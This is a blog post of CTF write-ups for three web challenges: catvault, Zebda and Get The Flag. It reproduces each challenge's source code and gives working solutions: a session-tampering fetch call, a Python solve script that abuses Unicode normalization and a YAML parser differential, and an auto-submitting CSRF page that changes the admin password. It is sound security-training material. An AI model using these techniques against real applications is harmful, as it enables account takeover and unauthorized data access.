@@ -1,0 +1,1172 @@
+---
+layout: post
+title:  "Web Challenges"
+date:   2026-08-04 17:35:00 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /L3AK-CTF-web/
+---
+* TOC
+{:toc}
+## catvault - part 1
+
+**Author**: sy1vi3
+
+**Category**: Web Exploitation
+
+**Description**: Just cat the flag, as the kids say.
+
+I downloaded the challenge files:
+```shell
+unzip catvault.zip  
+Archive:  catvault.zip  
+  inflating: Dockerfile  
+  inflating: app.py  
+  inflating: db.py  
+  inflating: docker-compose.yml  
+  inflating: entrypoint.sh  
+  inflating: flag.txt  
+  inflating: readflag.c  
+ extracting: requirements.txt  
+   creating: templates/  
+  inflating: templates/base.html  
+  inflating: templates/login.html  
+  inflating: templates/register.html  
+  inflating: templates/vault.html
+```
+
+`app.py`:
+```python
+import random
+import mariadb
+from flask import (
+    Flask,
+    abort,
+    flash,
+    jsonify,
+    redirect,
+    render_template,
+    request,
+    session,
+    url_for,
+)
+import db
+
+app = Flask(__name__)
+app.secret_key = random.randbytes(32)
+
+DEFAULT_PREFS = {"theme": "light", "layout": "grid", "density": "cozy"}
+
+
+@app.route("/")
+def index():
+    if "user_id" in session:
+        return redirect(url_for("vault"))
+    return redirect(url_for("login"))
+
+
+@app.route("/register", methods=["GET", "POST"])
+def register():
+    if request.method == "GET":
+        return render_template("register.html", theme=session.get("theme", "light"))
+
+    username = (request.form.get("username") or "").strip()
+    password = request.form.get("password") or ""
+    if not username or not password:
+        flash("wtf do you think ur doing", "error")
+        return redirect(url_for("register"))
+    if len(username) > 32:
+        flash("das too long", "error")
+        return redirect(url_for("register"))
+
+    try:
+        user_id = db.create_user(username, password.encode())
+    except mariadb.IntegrityError:
+        flash("kitties can't all have the same name...", "error")
+        return redirect(url_for("register"))
+
+    session.clear()
+    session["user_id"] = user_id
+    session["username"] = username
+    return redirect(url_for("vault"))
+
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "GET":
+        return render_template("login.html", theme=session.get("theme", "light"))
+
+    username = (request.form.get("username") or "").strip()
+    password = request.form.get("password") or ""
+
+    db.login(username, password.encode())
+    row = db.cursor.fetchone()
+    if row is None:
+        flash("meowsername or pawssword incorrect", "error")
+        return redirect(url_for("login"))
+
+    user_id, name, _ = row
+    session.clear()
+    session["user_id"] = user_id
+    session["username"] = name
+    return redirect(url_for("vault"))
+
+
+@app.route("/logout", methods=["POST"])
+def logout():
+    session.clear()
+    return redirect(url_for("login"))
+
+
+@app.route("/vault", methods=["GET", "POST"])
+def vault():
+    if "user_id" not in session:
+        return redirect(url_for("login"))
+
+    if request.method == "POST":
+        content = (request.form.get("content") or "").strip()
+        if not content:
+            flash("yap a bit more please", "error")
+        elif len(content) > 2000:
+            flash("didnt ask", "error")
+        else:
+            db.add_vault_entry(session["user_id"], content)
+            flash("secret saved", "ok")
+        return redirect(url_for("vault"))
+
+    try:
+        entries = db.get_vault_entries(session["user_id"])
+    except mariadb.Error:
+        entries = []
+        flash("there's been a pawblem...", "error")
+
+    return render_template(
+        "vault.html",
+        entries=entries,
+        username=session.get("username", "cat"),
+        theme=session.get("theme", "light"),
+    )
+
+
+@app.route("/api/settings", methods=["GET", "POST"])
+def settings():
+    if "user_id" not in session:
+        abort(401)
+
+    if request.method == "GET":
+        prefs = {k: session.get(k, v) for k, v in DEFAULT_PREFS.items()}
+        return jsonify(prefs)
+
+    incoming = request.get_json(silent=True)
+    if not isinstance(incoming, dict):
+        abort(400)
+
+    saved = {}
+    for key, value in incoming.items():
+        if not isinstance(key, str) or key.startswith("_") or not isinstance(value, str):
+            continue
+        session[key] = value
+        saved[key] = value
+
+    return jsonify({"ok": True, "saved": saved})
+
+
+if __name__ == "__main__":
+    db.connect()
+    app.run(host="0.0.0.0", port=8080)
+```
+
+`db.py`:
+```python
+import mariadb
+from mariadb.constants import CLIENT
+from hashlib import sha256
+import os
+
+config = {
+    "host": "127.0.0.1",
+    "port": 3306,
+    "user": "meower",
+    "password": "meowmeowmeow",
+    "database": "catvault"
+}
+
+FLAG = os.environ.get("FLAG", "L3AK{real_flag_not_for_testing}")
+
+conn: mariadb.Connection = None
+cursor: mariadb.Cursor = None
+
+initialized = False
+
+def create_tables():
+    connect()
+    cursor.execute("CREATE OR REPLACE TABLE users ( id INT PRIMARY KEY AUTO_INCREMENT, name VARCHAR(32) UNIQUE, password VARCHAR(64) );")
+    cursor.execute("CREATE OR REPLACE TABLE vault ( id INT PRIMARY KEY AUTO_INCREMENT, user_id INT, content TEXT );")
+
+def create_admin():
+    connect()
+    cursor.execute("INSERT INTO users (name, password) VALUES ('admin', 'nologin');")
+    conn.commit()
+    cursor.execute(f"INSERT INTO vault (user_id, content) VALUES ({cursor.lastrowid}, '{FLAG}');")
+    conn.commit()
+
+def connect():
+    global conn, cursor, initialized
+    try:
+        conn._check_closed()
+        return
+    except:
+        pass
+    conn = mariadb.connect(**config, client_flag=CLIENT.MULTI_STATEMENTS)
+    cursor = conn.cursor()
+    if not initialized:
+        create_tables()
+        create_admin()
+        initialized = True
+
+def create_user(username, password):
+    connect()
+    cursor.execute("INSERT INTO users (name, password) VALUES (?, ?);", (username, sha256(password).digest().hex()))
+    conn.commit()
+    return cursor.lastrowid
+
+def login(username, password):
+    connect()
+    cursor.execute("SELECT id, name, password FROM users WHERE name = ? AND password = ?;", (username, sha256(password).digest().hex()))
+
+def get_vault_entries(user_id):
+    connect()
+    cursor.execute(f"SELECT id, content FROM vault WHERE id = {user_id};")
+    return [i for i in cursor]
+
+def add_vault_entry(user_id, content):
+    connect()
+    cursor.execute(f"INSERT INTO vault (user_id, content) VALUES ({user_id}, ?);", (content,))
+    conn.commit()
+    return cursor.lastrowid
+```
+
+I went to my instance at `https://catvault-1-9e24a624c9dd.instances.ctf.l3ak.team/` and registered an account and logged in. The `/api/settings` endpoint lets you set `session["user_id"]` to any value.
+
+I ran this js and my browser console:
+```js
+fetch('/api/settings', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({user_id: "1"}),
+  credentials: 'include'
+})
+.then(r => r.json())
+.then(console.log);
+```
+
+Then refresh the page:
+
+![Alt text](/images/leakweb1.png)
+
+`L3AK{i7_W4s_a_veRY_e45Y_web_Ch4lleNg3_soRrY_t0_B0Re_you_4l1_W1tH_7H3_Dumb_pr373xt_N0W_6o_5olve_the_Real_one}`
+
+___
+
+## Zebda
+
+**Author**: Minyawy
+
+**Category**: Web Exploitation
+
+**Description**: I wonder why Egyptian food has so much Zebda. They say the Zebda is what makes the food bypass your stomach and go straight to your heart. The kitchen just opened; grab a plate while it's still warm. `https://zebda.instances.ctf.l3ak.team`
+
+I get the challenge files:
+```shell
+unzip zebda.zip  
+Archive:  zebda.zip  
+   creating: zebda/  
+   creating: zebda/nginx/  
+  inflating: zebda/nginx/default.conf  
+   creating: zebda/worker/  
+ extracting: zebda/worker/requirements.txt  
+  inflating: zebda/worker/.dockerignore  
+  inflating: zebda/worker/app.py  
+  inflating: zebda/worker/Dockerfile  
+  inflating: zebda/README.md  
+   creating: zebda/middleware/  
+  inflating: zebda/middleware/.dockerignore  
+  inflating: zebda/middleware/package-lock.json  
+  inflating: zebda/middleware/Dockerfile  
+   creating: zebda/middleware/src/  
+   creating: zebda/middleware/src/public/  
+  inflating: zebda/middleware/src/public/index.html  
+  inflating: zebda/middleware/src/server.js  
+  inflating: zebda/middleware/package.json  
+ extracting: zebda/flag.txt  
+  inflating: zebda/docker-compose.yml
+```
+
+`server.js`:
+```js
+import express from 'express';
+import { randomUUID } from 'node:crypto';
+import { fileURLToPath } from 'node:url';
+import { dirname, join } from 'node:path';
+import yaml from 'js-yaml';
+
+const __dirname = dirname(fileURLToPath(import.meta.url));
+
+const app = express();
+const port = Number(process.env.PORT ?? 8080);
+const WORKER_URL = process.env.WORKER_URL ?? 'http://worker:8000';
+const WORKER_TIMEOUT_MS = 8000;
+
+app.disable('x-powered-by');
+
+const projects = new Map();
+const builds = new Map();
+
+const reservedNames = new Set(['system', 'admin']);
+
+function isReservedProjectName(slug) {
+  return reservedNames.has(slug.toLowerCase());
+}
+
+const jsonBodyParser = express.json({ limit: '16kb' });
+const yamlBodyParser = express.text({
+  type: [
+    'application/yaml',
+    'application/x-yaml',
+    'text/yaml',
+    'text/plain',
+  ],
+  limit: '16kb',
+});
+
+function publicProject(project) {
+  return { id: project.id, slug: project.slug, createdAt: project.createdAt };
+}
+
+function publicBuild(build) {
+  return {
+    id: build.id,
+    projectId: build.projectId,
+    status: build.status,
+    artifact: build.artifact,
+    logs: build.logs,
+    createdAt: build.createdAt,
+  };
+}
+
+function validateManifest(manifest) {
+  if (!manifest || typeof manifest !== 'object' || Array.isArray(manifest)) {
+    throw new Error('Manifest must be an object');
+  }
+  if (!manifest.job || typeof manifest.job !== 'object') {
+    throw new Error('Manifest must contain a job');
+  }
+  if (manifest.job.action !== 'translate') {
+    throw new Error('Unsupported action');
+  }
+  if (typeof manifest.job.source !== 'string') {
+    throw new Error('Source must be a string');
+  }
+
+  let sourceUrl;
+  try {
+    sourceUrl = new URL(manifest.job.source);
+  } catch {
+    throw new Error('Source must be a valid URL');
+  }
+  if (sourceUrl.protocol !== 'https:') {
+    throw new Error('Only HTTPS sources are allowed');
+  }
+}
+
+app.get('/health', (req, res) => {
+  return res.json({
+    message: 'App is pretty healthy and eating Koshary',
+    service: 'middleware',
+  });
+});
+
+app.post('/api/projects', jsonBodyParser, (req, res) => {
+  const slug = req.body?.slug;
+  if (typeof slug !== 'string' || slug.length === 0 || slug.length > 200) {
+    return res.status(400).json({ error: 'slug must be a non-empty string' });
+  }
+  if (isReservedProjectName(slug)) {
+    return res.status(403).json({ error: 'Reserved project name' });
+  }
+
+  const project = {
+    id: randomUUID(),
+    slug,
+    createdAt: new Date().toISOString(),
+  };
+  projects.set(project.id, project);
+  return res.status(201).json(publicProject(project));
+});
+
+app.get('/api/projects', (req, res) => {
+  return res.json({ projects: [...projects.values()].map(publicProject) });
+});
+
+app.get('/api/projects/:projectId', (req, res) => {
+  const project = projects.get(req.params.projectId);
+  if (!project) {
+    return res.status(404).json({ error: 'Project not found' });
+  }
+  return res.json(publicProject(project));
+});
+
+app.post('/api/projects/:projectId/builds', yamlBodyParser, async (req, res) => {
+  const project = projects.get(req.params.projectId);
+  if (!project) {
+    return res.status(404).json({ error: 'Project not found' });
+  }
+
+  const rawManifest = req.body;
+  if (typeof rawManifest !== 'string' || rawManifest.length === 0) {
+    return res.status(400).json({ error: 'Manifest body is required' });
+  }
+
+  let parsedManifest;
+  try {
+    parsedManifest = yaml.load(rawManifest);
+  } catch {
+    return res.status(400).json({ error: 'Manifest is not valid YAML' });
+  }
+
+  try {
+    validateManifest(parsedManifest);
+  } catch (err) {
+    return res.status(400).json({ error: err.message });
+  }
+
+  const build = {
+    id: randomUUID(),
+    projectId: project.id,
+    status: 'pending',
+    artifact: null,
+    logs: [],
+    createdAt: new Date().toISOString(),
+  };
+  builds.set(build.id, build);
+
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), WORKER_TIMEOUT_MS);
+  try {
+    const workerResp = await fetch(`${WORKER_URL}/run`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ slug: project.slug, manifest: rawManifest }),
+      signal: controller.signal,
+    });
+
+    const data = await workerResp.json().catch(() => ({}));
+    if (workerResp.ok && data.ok) {
+      build.status = 'success';
+      build.artifact = data.artifact ?? null;
+      build.logs = Array.isArray(data.logs) ? data.logs : [];
+    } else {
+      build.status = 'failed';
+      build.logs = Array.isArray(data.logs) ? data.logs : [];
+      if (data.error) build.logs.push(data.error);
+    }
+  } catch {
+    build.status = 'failed';
+    build.logs = ['Worker unavailable'];
+  } finally {
+    clearTimeout(timeout);
+  }
+
+  return res.status(201).json(publicBuild(build));
+});
+
+app.get('/api/builds/:buildId', (req, res) => {
+  const build = builds.get(req.params.buildId);
+  if (!build) {
+    return res.status(404).json({ error: 'Build not found' });
+  }
+  return res.json(publicBuild(build));
+});
+
+app.use(express.static(join(__dirname, 'public')));
+
+app.listen(port, '0.0.0.0');
+```
+
+`app.py`:
+```python
+import os
+import unicodedata
+from pathlib import Path
+from urllib.parse import urlsplit
+
+import yaml
+from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+FLAG_PATH = os.environ.get("FLAG_PATH", "/flag.txt")
+MAX_MANIFEST_BYTES = 16 * 1024
+
+POLICIES = {
+    "standard": {"translate"},
+    "system": {"translate", "import"},
+}
+
+
+def canonicalize_slug(raw_slug):
+    return unicodedata.normalize("NFKC", raw_slug).casefold()
+
+
+def select_policy(raw_slug):
+    if canonicalize_slug(raw_slug) == "system":
+        return "system"
+    return "standard"
+
+
+def translate(source):
+    return "Translation job completed"
+
+
+def import_bundle(source):
+    parsed = urlsplit(source)
+    if parsed.scheme != "file":
+        raise PermissionError("Invalid scheme")
+    if parsed.netloc != "":
+        raise PermissionError("Invalid file host")
+    if parsed.path != "/flag.txt":
+        raise PermissionError("Unknown internal bundle")
+    if parsed.query or parsed.fragment:
+        raise PermissionError("Invalid internal bundle")
+    return Path(FLAG_PATH).read_text(encoding="utf-8").strip()
+
+
+@app.get("/health")
+def health():
+    return jsonify(service="worker", status="ok")
+
+
+@app.post("/run")
+def run():
+    payload = request.get_json(silent=True)
+    if not isinstance(payload, dict):
+        return jsonify(ok=False, error="Invalid request"), 400
+
+    raw_slug = payload.get("slug")
+    raw_manifest = payload.get("manifest")
+    if not isinstance(raw_slug, str) or not isinstance(raw_manifest, str):
+        return jsonify(ok=False, error="Invalid request"), 400
+    if len(raw_manifest.encode("utf-8")) > MAX_MANIFEST_BYTES:
+        return jsonify(ok=False, error="Manifest too large"), 413
+
+    allowed_actions = POLICIES[select_policy(raw_slug)]
+
+    try:
+        manifest = yaml.safe_load(raw_manifest)
+    except yaml.YAMLError:
+        return jsonify(ok=False, error="Manifest could not be parsed"), 400
+
+    if not isinstance(manifest, dict) or not isinstance(manifest.get("job"), dict):
+        return jsonify(ok=False, error="Manifest must contain a job"), 400
+
+    job = manifest["job"]
+    action = job.get("action")
+    source = job.get("source")
+    if not isinstance(action, str) or not isinstance(source, str):
+        return jsonify(ok=False, error="Invalid job"), 400
+
+    if action not in allowed_actions:
+        return jsonify(ok=False, error="Action not allowed"), 403
+
+    try:
+        if action == "translate":
+            artifact = translate(source)
+        elif action == "import":
+            artifact = import_bundle(source)
+        else:
+            return jsonify(ok=False, error="Unsupported action"), 400
+    except PermissionError as exc:
+        return jsonify(ok=False, error=str(exc)), 403
+    except OSError:
+        return jsonify(ok=False, error="Bundle unavailable"), 500
+
+    return jsonify(ok=True, artifact=artifact)
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
+```
+
+`docker-compose.yml`:
+```yml
+name: zebda
+
+services:
+  middleware:
+    build:
+      context: ./middleware
+      dockerfile: Dockerfile
+    environment:
+      PORT: "8080"
+      WORKER_URL: "http://worker:8000"
+      NODE_ENV: "production"
+    depends_on:
+      - worker
+    networks:
+      - frontend
+      - backend
+    expose:
+      - "8080"
+
+
+  worker:
+    build:
+      context: ./worker
+      dockerfile: Dockerfile
+    environment:
+      PORT: "8000"
+      FLAG_PATH: "/flag.txt"
+    volumes:
+      - ./flag.txt:/flag.txt:ro
+    networks:
+      - backend
+    expose:
+      - "8000"
+
+
+  nginx:
+    image: nginx:stable-alpine3.24-slim
+    ports:
+      - "80:80"
+    networks:
+      - frontend
+    volumes:
+      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf:ro
+    depends_on:
+      - middleware
+
+
+networks:
+  frontend:
+  
+  backend:
+    internal: true
+```
+
+Looking at the site:
+
+![Alt text](/images/leakweb2.png)
+
+There are three parts talking to each other here:
+- nginx simply forwards traffic
+- middleware (`middleware/src/server.js`) takes your requests, does some safety checks, then passes your job to the worker
+- the worker (`worker/app.py`) has the flag
+
+The middleware is supposed to stop you from ever asking the worker to do dangerous things. There were two separate bugs here. 
+
+The app gives you extra permissions and allows you to read the flag if your projects "slug" name equals `"system"`. First it runs the text through a unicode cleanup function called [NFKC normalization](https://en.wikipedia.org/wiki/Unicode_equivalence), then lowercases it:
+```js
+reservedNames.has(slug.toLowerCase())
+```
+
+The trick is that unicode has "fullwidth" letters: `ｓｙｓｔｅｍ` instead of `system`. JavaScripts `.toLowerCase()` doesnt know that it's "the same word" as normal `system` so it is let through. 
+
+Pythons NFKC cleanup does know that it's the same word and converts `ｓｙｓｔｅｍ` back into plain `system`. This makes the app think you're the system account.
+
+When you submit a "build" you send a YAML text note describing the job. The middleware reads the note (using a JS YAML reader) to make sure youre only asking for a safe `translate` job. If it looks safe it forwards the exact same raw text to `app.py` which reads it again, but with a Python YAML reader.
+
+Two YAML readers should normally agree on what a note says. But theres an invisible character (Unicode "`NEL`") that the Python reader treats as a real line break, while the JavaScript reader treats it as a random harmless character.
+
+You can write a note like this:
+```YAML
+job:
+  source: https://example.com
+  action: translate
+  notes: |
+    hello<NEL>  action: import<NEL>  source: file:///flag.txt
+```
+- The JS reader (middleware) doesnt understand `<NEL>` as a new line, so it just reads that whole last chunk as random text inside the harmless "notes" field. 
+- The Python reader (`app.py`) does treat `<NEL>` as a new line, so it reads those hidden lines as real instructions, overwriting the earlier ones: `action: import`, `source: file:///flag.txt`.
+
+Solve script:
+```python
+#!/usr/bin/env python3
+import requests
+
+BASE = "https://zebda.instances.ctf.l3ak.team"
+SLUG = "\uff53\uff59\uff53\uff54\uff45\uff4d"
+
+MANIFEST = (
+    "job:\n"
+    "  source: https://example.com\n"
+    "  action: translate\n"
+    "  notes: |\n"
+    "    hello\u0085  action: import\u0085  source: file:///flag.txt\n"
+)
+
+def main():
+    s = requests.Session()
+
+    r = s.post(f"{BASE}/api/projects", json={"slug": SLUG}, timeout=15)
+    print("[create project]", r.status_code, r.text)
+    r.raise_for_status()
+    project_id = r.json()["id"]
+
+    r = s.post(
+        f"{BASE}/api/projects/{project_id}/builds",
+        data=MANIFEST.encode("utf-8"),
+        headers={"content-type": "text/yaml"},
+        timeout=15,
+    )
+    print("[submit build]", r.status_code, r.text)
+
+if __name__ == "__main__":
+    main()
+```
+
+Output:
+```shell
+python3 solve.py  
+[create project] 201 {"id":"533d0baa-c1a1-4123-8866-c84a973b20ae","slug":"ｓｙｓｔｅｍ","createdAt":"2026-07-31T19:30:33.395Z"}  
+[submit build] 201 {"id":"ad5d4c29-8583-46a3-8d83-0897617b9df1","projectId":"533d0baa-c1a1-4123-8866-c84a973b20ae","status":"success","artifact":"L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}","logs":[],"createdAt":"2026-07-31T19:30:33.639Z"}
+```
+
+`L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}`
+
+___
+
+## Get The Flag
+
+**Author**: Minyawy
+
+**Category**: Web Exploitation
+
+**Description**: get the flag and submit it, Did people forget how to submit flags!?
+
+I download the challenge files and unzip them:
+```shell
+unzip get-the-flag.zip  
+Archive:  get-the-flag.zip  
+   creating: app/  
+  inflating: app/app.js  
+  inflating: app/package.json  
+  inflating: app/bot.js  
+  inflating: app/Dockerfile  
+  inflating: app/db.js  
+   creating: app/views/  
+  inflating: app/views/register.ejs  
+  inflating: app/views/create-page.ejs  
+  inflating: app/views/login.ejs  
+  inflating: app/views/report.ejs  
+  inflating: app/views/flag.ejs  
+  inflating: app/views/dashboard.ejs  
+  inflating: app/views/change-password.ejs  
+  inflating: docker-compose.yml
+```
+
+`app.js`:
+```js
+const express = require("express");
+const session = require("express-session");
+const methodOverride = require("method-override");
+const crypto = require("crypto");
+const path = require("path");
+const fs = require("fs");
+const { v4: uuidv4 } = require("uuid");
+
+const {
+  createUser,
+  findUserByUsername,
+  findUserById,
+  verifyPassword,
+  changePassword,
+} = require("./db");
+const { visitPage } = require("./bot");
+
+const app = express();
+const FLAG = process.env.FLAG || "L3AK{FAKE_FLAG_FOR_TESTING}";
+const PAGES_DIR = path.join(__dirname, "uploads");
+
+app.set("view engine", "ejs");
+app.set("views", path.join(__dirname, "views"));
+
+fs.mkdirSync(PAGES_DIR, { recursive: true });
+
+app.use(express.urlencoded({ extended: false }));
+
+app.use(
+  methodOverride((req) => {
+    if (typeof req.query._method === "string") {
+      return req.query._method.toUpperCase();
+    }
+  })
+);
+
+app.use(
+  session({
+    secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex"),
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+      httpOnly: true,
+      sameSite: "lax",
+    },
+  })
+);
+
+app.use((req, res, next) => {
+  if (req.session.userId && !req.session.csrf) {
+    req.session.csrf = crypto.randomBytes(32).toString("hex");
+  }
+  next();
+});
+
+function requireLogin(req, res, next) {
+  if (!req.session.userId) {
+    return res.redirect("/login");
+  }
+  next();
+}
+
+function csrfOnPostOnly(req, res, next) {
+  if (req.method !== "POST") {
+    return next();
+  }
+
+  if (!req.body.csrf || req.body.csrf !== req.session.csrf) {
+    return res.status(403).send("Invalid CSRF token");
+  }
+
+  next();
+}
+
+app.get("/", (req, res) => {
+  if (req.session.userId) return res.redirect("/dashboard");
+  res.redirect("/login");
+});
+
+app.get("/login", (req, res) => {
+  if (req.session.userId) return res.redirect("/dashboard");
+  res.render("login", { error: null });
+});
+
+app.post("/login", (req, res) => {
+  const { username, password } = req.body;
+
+  if (!username || !password) {
+    return res.render("login", { error: "Username and password are required" });
+  }
+
+  const user = findUserByUsername(username);
+  if (!user || !verifyPassword(password, user.password)) {
+    return res.render("login", { error: "Invalid credentials" });
+  }
+
+  req.session.userId = user.id;
+  req.session.username = user.username;
+  req.session.csrf = crypto.randomBytes(32).toString("hex");
+  res.redirect("/dashboard");
+});
+
+app.get("/register", (req, res) => {
+  if (req.session.userId) return res.redirect("/dashboard");
+  res.render("register", { error: null });
+});
+
+app.post("/register", (req, res) => {
+  const { username, password, confirm } = req.body;
+
+  if (!username || !password || !confirm) {
+    return res.render("register", { error: "All fields are required" });
+  }
+
+  if (password !== confirm) {
+    return res.render("register", { error: "Passwords do not match" });
+  }
+
+  if (password.length < 6) {
+    return res.render("register", { error: "Password must be at least 6 characters" });
+  }
+
+  if (username.length < 3 || username.length > 20) {
+    return res.render("register", { error: "Username must be 3-20 characters" });
+  }
+
+  try {
+    createUser(username, password);
+  } catch {
+    return res.render("register", { error: "Username already taken" });
+  }
+
+  res.redirect("/login");
+});
+
+app.get("/logout", (req, res) => {
+  req.session.destroy();
+  res.redirect("/login");
+});
+
+app.get("/dashboard", requireLogin, (req, res) => {
+  const user = findUserById(req.session.userId);
+  if (!user) {
+    req.session.destroy();
+    return res.redirect("/login");
+  }
+  res.render("dashboard", { user, csrf: req.session.csrf });
+});
+
+app.all(
+  "/account/change-password",
+  requireLogin,
+  csrfOnPostOnly,
+  (req, res) => {
+    if (!["GET", "POST"].includes(req.method)) {
+      return res.sendStatus(405);
+    }
+
+    if (req.method === "GET" && !req.body?.password) {
+      return res.render("change-password", { csrf: req.session.csrf });
+    }
+
+    const { password, confirm } = req.body ?? {};
+
+    if (!password || password !== confirm || password.length < 8) {
+      return res
+        .status(400)
+        .send("Password and confirmation must match (min 8 chars)");
+    }
+
+    changePassword(req.session.userId, password);
+    res.send("Password changed successfully");
+  }
+);
+
+app.get("/flag", requireLogin, (req, res) => {
+  const user = findUserById(req.session.userId);
+  if (!user || user.role !== "admin") {
+    return res.status(403).render("flag", { flag: null });
+  }
+  res.render("flag", { flag: FLAG });
+});
+
+app.get("/report", requireLogin, (req, res) => {
+  res.render("report", { result: null });
+});
+
+app.post("/report", requireLogin, async (req, res) => {
+  const { url } = req.body;
+
+  if (!url) {
+    return res.render("report", { result: { success: false, error: "Page path is required" } });
+  }
+
+  if (!url.startsWith("/pages/") || url.includes("..")) {
+    return res.render("report", {
+      result: { success: false, error: "Path must start with /pages/" },
+    });
+  }
+
+  const result = await visitPage(url);
+  res.render("report", { result });
+});
+
+app.get("/pages/create", requireLogin, (req, res) => {
+  res.render("create-page", { result: null });
+});
+
+app.post("/pages/upload", requireLogin, (req, res) => {
+  const { html } = req.body;
+  if (!html || html.length > 1024 * 50) {
+    return res.status(400).json({ error: "HTML content required (max 50KB)" });
+  }
+
+  const id = uuidv4();
+  const filename = `${id}.html`;
+  fs.writeFileSync(path.join(PAGES_DIR, filename), html);
+
+  const pageUrl = `/pages/${filename}`;
+  if (req.headers.accept?.includes("application/json")) {
+    return res.json({ url: pageUrl });
+  }
+  res.render("create-page", { result: { url: pageUrl } });
+});
+
+app.get("/pages/:file", (req, res) => {
+  const file = path.basename(req.params.file);
+  const filePath = path.join(PAGES_DIR, file);
+
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send("Page not found");
+  }
+
+  res.set(
+    "Content-Security-Policy",
+    "sandbox allow-scripts allow-forms allow-same-origin; connect-src 'none'; frame-src 'none'; object-src 'none'"
+  );
+  res.type("html").send(fs.readFileSync(filePath, "utf8"));
+});
+
+app.listen(3000);
+```
+
+`bot.js`:
+```js
+const puppeteer = require("puppeteer");
+const { ADMIN_PASSWORD } = require("./db");
+
+const APP_URL = "http://localhost:3000";
+let busy = false;
+
+async function visitPage(pagePath) {
+  if (busy) {
+    return { success: false, error: "Bot is busy, try again later" };
+  }
+
+  if (!pagePath.startsWith("/pages/") || pagePath.includes("..")) {
+    return { success: false, error: "Invalid page path" };
+  }
+
+  busy = true;
+  let browser;
+
+  try {
+    browser = await puppeteer.launch({
+      headless: "new",
+      args: [
+        "--no-sandbox",
+        "--disable-setuid-sandbox",
+        "--disable-dev-shm-usage",
+        "--disable-gpu",
+      ],
+    });
+
+    const page = await browser.newPage();
+
+    await page.goto(`${APP_URL}/login`, {
+      waitUntil: "networkidle2",
+      timeout: 10000,
+    });
+
+    await page.type('input[name="username"]', "admin");
+    await page.type('input[name="password"]', ADMIN_PASSWORD);
+    await Promise.all([
+      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 10000 }),
+      page.click('button[type="submit"]'),
+    ]);
+
+    await page.goto(`${APP_URL}${pagePath}`, {
+      waitUntil: "networkidle2",
+      timeout: 10000,
+    });
+    await new Promise((r) => setTimeout(r, 5000));
+
+    return { success: true };
+  } catch {
+    return { success: false, error: "Bot encountered an error" };
+  } finally {
+    if (browser) await browser.close().catch(() => {});
+    busy = false;
+  }
+}
+
+module.exports = { visitPage };
+```
+
+`db.js`:
+```js
+const Database = require("better-sqlite3");
+const bcrypt = require("bcryptjs");
+const crypto = require("crypto");
+
+const db = new Database("/tmp/ctf.db");
+
+db.pragma("journal_mode = WAL");
+
+db.exec(`
+  CREATE TABLE IF NOT EXISTS users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT UNIQUE NOT NULL,
+    password TEXT NOT NULL,
+    role TEXT NOT NULL DEFAULT 'user'
+  )
+`);
+
+const ADMIN_PASSWORD = crypto.randomBytes(32).toString("hex");
+const hash = bcrypt.hashSync(ADMIN_PASSWORD, 10);
+
+const existing = db.prepare("SELECT id FROM users WHERE username = ?").get("admin");
+if (!existing) {
+  db.prepare("INSERT INTO users (username, password, role) VALUES (?, ?, ?)").run("admin", hash, "admin");
+}
+
+function createUser(username, password) {
+  const hashed = bcrypt.hashSync(password, 10);
+  return db.prepare("INSERT INTO users (username, password, role) VALUES (?, ?, 'user')").run(username, hashed);
+}
+
+function findUserByUsername(username) {
+  return db.prepare("SELECT * FROM users WHERE username = ?").get(username);
+}
+
+function findUserById(id) {
+  return db.prepare("SELECT * FROM users WHERE id = ?").get(id);
+}
+
+function verifyPassword(plaintext, hashed) {
+  return bcrypt.compareSync(plaintext, hashed);
+}
+
+function changePassword(userId, newPassword) {
+  const hashed = bcrypt.hashSync(newPassword, 10);
+  db.prepare("UPDATE users SET password = ? WHERE id = ?").run(hashed, userId);
+}
+
+module.exports = {
+  ADMIN_PASSWORD,
+  createUser,
+  findUserByUsername,
+  findUserById,
+  verifyPassword,
+  changePassword,
+};
+```
+
+The endpoint `/account/change-password` uses:
+- `csrfOnPostOnly` checks CSRF token only for POST requests
+- `methodOverride` middleware allows overriding the HTTP method via `?_method=GET` in the query string
+
+First I registered a normal user and logged in:
+
+![Alt text](/images/leakweb3.png)
+
+Then upload a malicious HTML page via `/pages/upload` with this content:
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="pwn" method="POST" action="/account/change-password?_method=GET">
+    <input type="hidden" name="password" value="hacker123">
+    <input type="hidden" name="confirm" value="hacker123">
+  </form>
+  <script>
+    document.getElementById('pwn').submit();
+  </script>
+</body>
+</html>
+```
+
+Then I report my page (`/pages/1ed786a4-1099-49b7-9d24-7bcf18903eb5.html`) on `/report`:
+
+![Alt text](/images/leakweb4.png)
+
+The bot logs in as admin and visits the page. The page automatically submits the password change form so the admins password becomes `hacker123`.
+
+Then log in as admin:
+
+![Alt text](/images/leakweb5.png)
+
+On `https://get-the-flag-ba61f0f15b24.instances.ctf.l3ak.team/flag`:
+
+![Alt text](/images/leakweb6.png)
+
+`L3AK{M37HoD_oVerR1De_C5RF_bYpass_60_BrrrR}`
